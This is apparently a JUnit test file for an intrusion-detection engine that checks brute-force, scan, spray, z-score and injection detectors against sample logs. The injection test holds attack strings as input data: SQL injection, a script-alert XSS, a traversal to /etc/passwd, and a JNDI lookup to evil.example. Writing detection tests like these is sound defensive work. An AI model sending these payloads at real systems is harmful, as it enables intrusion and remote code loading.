package com.aegislens.intrusion;

import com.aegislens.core.Finding;
import com.aegislens.core.Severity;
import com.aegislens.intrusion.LogEvent.Action;
import com.aegislens.util.CidrSet;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.io.TempDir;

import java.nio.file.Files;
import java.nio.file.Path;
import java.time.Clock;
import java.time.Instant;
import java.time.ZoneOffset;
import java.util.ArrayList;
import java.util.List;

import static org.junit.jupiter.api.Assertions.*;

/** Acceptance tests I1 to I7 and I9 on the real sample files, plus scores per the README rule table and memory bounds. */
class DetectorTest {

    private static final Clock CLOCK = Clock.fixed(Instant.parse("2026-10-29T12:00:00Z"), ZoneOffset.UTC);
    private static final Thresholds T = Thresholds.defaults(ZoneOffset.UTC);

    @TempDir
    Path dir;

    @Test
    void authLogI1toI3() throws Exception {
        List<Finding> found = replay(Path.of("sample-data", "auth.log"), new SshLogSource(CLOCK, ZoneOffset.UTC));

        List<Finding> brute = of(found, "NET-001");
        assertEquals(2, brute.size(), "one alert at the 5th failure, one escalation: " + brute);
        assertEquals("203.0.113.45", brute.get(0).target());
        assertEquals(60, brute.get(0).score());
        Finding escalated = brute.get(1);
        assertEquals(Severity.CRITICAL, escalated.severity(), "I1: a login succeeded at 02:14:20");
        assertEquals(90, escalated.score());
        assertEquals("7", escalated.evidence().get("failures"), "I1: 7 failures in 13 s");
        assertEquals("test", escalated.evidence().get("user"));

        List<Finding> odd = of(found, "NET-003");
        assertEquals(List.of("test", "carol"), odd.stream().map(f -> f.evidence().get("user")).toList(),
                "I2: test at 02:14:20 and carol at 03:41, not alice or bob");

        assertTrue(found.stream().noneMatch(f -> f.target().equals("198.51.100.22")), "I3: bob's single failure is fine");
        assertTrue(of(found, "NET-007").isEmpty(), "only 4 distinct user names: no spraying");
    }

    @Test
    void accessLogI4toI6() throws Exception {
        List<Finding> found = replay(Path.of("sample-data", "access.log"), new WebLogSource());

        List<Finding> scan = of(found, "NET-002");
        assertEquals(1, scan.size(), "I4");
        assertEquals("203.0.113.45", scan.get(0).target());
        assertEquals(55, scan.get(0).score(), "fires when the 15th distinct path arrives");

        List<Finding> injection = of(found, "WEB-002");
        assertEquals(2, injection.size(), "I5: the two /products?id= requests");
        assertTrue(injection.stream().allMatch(f -> f.score() == 70 && f.target().equals("203.0.113.45")));

        List<Finding> tool = of(found, "NET-006");
        assertEquals(List.of(40, 55), tool.stream().map(Finding::score).toList(), "sqlmap: 40, then 55 once 4xx answers appear");

        assertTrue(found.stream().noneMatch(f -> f.target().startsWith("198.51.100.")), "I6");
    }

    @Test
    void garbageLinesAreCountedAndSkippedI7() throws Exception {
        Path log = dir.resolve("mixed.log");
        Files.writeString(log, Files.readString(Path.of("sample-data", "auth.log"))
                + "this is not a log line\n\u0000\u0001\u0002binary\n" + "x".repeat(20_000) + "\n"
                + "Oct 21 02:14:01 srv sshd[1]: Failed password for root from not-an-ip port 1 ssh2\n");
        DetectionEngine engine = new DetectionEngine(T, new CidrSet(), new CidrSet());
        List<Finding> found = new ArrayList<>();
        DetectionEngine.ReplayResult r = engine.replay(log, new SshLogSource(CLOCK, ZoneOffset.UTC), found::add);
        assertEquals(3, r.malformed());
        assertEquals(1, r.overlong(), "the 20 000-character line is skipped without being read into memory");
        assertEquals(13, r.events());
        assertFalse(found.isEmpty(), "the scan finished and still found the attack");
    }

    @Test
    void zScoreFiresOnlyForTheSpikeI9() {
        ZScoreDetector z = new ZScoreDetector(T);
        Instant start = Instant.parse("2026-10-21T00:00:00Z");
        List<Finding> found = new ArrayList<>();
        for (int minute = 0; minute < 60; minute++) {
            for (int i = 0; i < 5; i++) {
                found.addAll(z.detect(request(start.plusSeconds(minute * 60L + i * 10L))));
            }
        }
        assertTrue(found.isEmpty(), "60 steady minutes: nothing");
        for (int i = 0; i < 50; i++) {
            found.addAll(z.detect(request(start.plusSeconds(60 * 60L + i))));
        }
        assertFalse(found.isEmpty(), "10x spike detected");
        assertTrue(found.stream().allMatch(f -> f.ruleId().equals("NET-004")));
        assertEquals(80, found.get(found.size() - 1).score(), "the band rises to z >= 5");
    }

    @Test
    void zScoreIgnoresRarelySeenIpsAndOutOfOrderLines() {
        ZScoreDetector z = new ZScoreDetector(T);
        Instant start = Instant.parse("2026-10-21T00:00:00Z");
        List<Finding> found = new ArrayList<>();
        found.addAll(z.detect(request(start)));
        for (int i = 0; i < 4; i++) {
            found.addAll(z.detect(request(start.plusSeconds(3 * 3600L + i))));    // 3 silent hours, then 4 requests
        }
        for (int i = 0; i < 20; i++) {
            found.addAll(z.detect(request(start.plusSeconds(60))));              // old lines replayed late
        }
        assertTrue(found.isEmpty(), found.toString());
    }

    @Test
    void sprayAndThreatIntelScores() {
        PasswordSprayDetector spray = new PasswordSprayDetector(T);
        Instant t0 = Instant.parse("2026-10-21T00:00:00Z");
        List<Finding> found = new ArrayList<>();
        for (String user : List.of("a", "b", "c", "d", "e", "f")) {
            found.addAll(spray.detect(LogEvent.login(t0, "ssh", "203.0.113.7", user, Action.FAILED_LOGIN, null, "x")));
        }
        assertEquals(1, found.size());
        assertEquals(65, found.get(0).score());

        CidrSet block = new CidrSet();
        block.add("198.51.100.0/24");
        CidrSet c2 = new CidrSet();
        c2.add("203.0.113.66");
        ThreatIntelDetector intel = new ThreatIntelDetector(block, c2, T);
        assertEquals(75, intel.detect(request(t0, "198.51.100.9")).get(0).score());
        assertEquals(90, intel.detect(request(t0, "203.0.113.66")).get(0).score());
        assertTrue(intel.detect(request(t0, "198.51.100.9")).isEmpty(), "once per IP");
    }

    @Test
    void injectionKindsAndDoubleEncoding() {
        SqlInjectionDetector d = new SqlInjectionDetector(T);
        Instant t0 = Instant.parse("2026-10-21T00:00:00Z");
        assertEquals("sql-injection", kind(d, "/q?id=1%2520UNION%2520SELECT%25201"));
        assertEquals("xss", kind(d, "/search?q=%3Cscript%3Ealert(1)%3C/script%3E"));
        assertEquals("path-traversal", kind(d, "/files?name=..%2F..%2Fetc%2Fpasswd"));
        assertEquals("jndi-lookup", kind(d, "/?x=${jndi:ldap://evil.example/a}"));
        assertTrue(d.detect(LogEvent.web(t0, "web", "1.2.3.4", null, "GET", "/products?id=7", 200, "x", "x")).isEmpty());
        assertTrue(d.detect(LogEvent.web(t0, "web", "1.2.3.4", null, "GET", "/%zz%", 200, "x", "x")).isEmpty(), "broken escape is fine");
    }

    @Test
    void memoryStaysBoundedWithAMillionIps() {
        Thresholds small = T.withMaxTrackedIps(50_000);
        BruteForceDetector brute = new BruteForceDetector(small);
        Instant t0 = Instant.parse("2026-10-21T00:00:00Z");
        for (int i = 0; i < 1_000_000; i++) {
            String ip = "10." + (i >> 16 & 255) + "." + (i >> 8 & 255) + "." + (i & 255);
            brute.detect(LogEvent.login(t0.plusMillis(i), "ssh", ip, "root", Action.FAILED_LOGIN, null, "x"));
        }
        assertEquals(50_000, brute.trackedIps());
    }

    private static String kind(SqlInjectionDetector d, String path) {
        LogEvent e = LogEvent.web(Instant.EPOCH, "web", "1.2.3.4", null, "GET", path, 200, "x", "x");
        return d.detect(e).get(0).evidence().get("kind");
    }

    private static LogEvent request(Instant at) {
        return request(at, "203.0.113.50");
    }

    private static LogEvent request(Instant at, String ip) {
        return LogEvent.web(at, "web", ip, null, "GET", "/", 200, "Mozilla", "x");
    }

    private static List<Finding> replay(Path file, LogSource source) throws Exception {
        List<Finding> found = new ArrayList<>();
        DetectionEngine.ReplayResult r = new DetectionEngine(T, new CidrSet(), new CidrSet()).replay(file, source, found::add);
        assertEquals(0, r.malformed(), "sample files must parse cleanly");
        return found;
    }

    private static List<Finding> of(List<Finding> all, String rule) {
        return all.stream().filter(f -> f.ruleId().equals(rule)).toList();
    }
}
